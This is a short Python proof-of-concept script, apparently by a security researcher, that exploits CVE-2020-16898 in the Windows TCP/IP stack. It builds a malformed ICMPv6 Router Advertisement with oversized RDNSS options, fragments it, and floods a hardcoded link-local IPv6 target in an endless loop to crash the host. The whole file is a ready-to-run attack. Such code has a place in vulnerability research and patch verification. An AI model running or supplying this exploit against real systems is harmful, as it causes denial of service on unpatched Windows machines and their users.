#!/usr/bin/env python3
#
# Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability
#
# Author: Adam 'pi3' Zabrocki
# http://pi3.com.pl
#

from scapy.all import *

v6_dst = 'fe80::743b:c3a3:9071:7587'
v6_src = "fe80::215:5dff:fe00:1800"

p_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
p_test = p_test_half + 'A'.encode()*4

c = ICMPv6NDOptEFA();

e = ICMPv6NDOptRDNSS()
e.len = 21
e.dns = [
"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]

pkt = ICMPv6ND_RA() / ICMPv6NDOptRDNSS(len=8) / \
      Raw(load='A'.encode()*16*2 + p_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \
              IPv6ExtHdrFragment()/pkt

l=fragment6(p_test_frag, 200)


while True:
	for p in l:
		send(p)
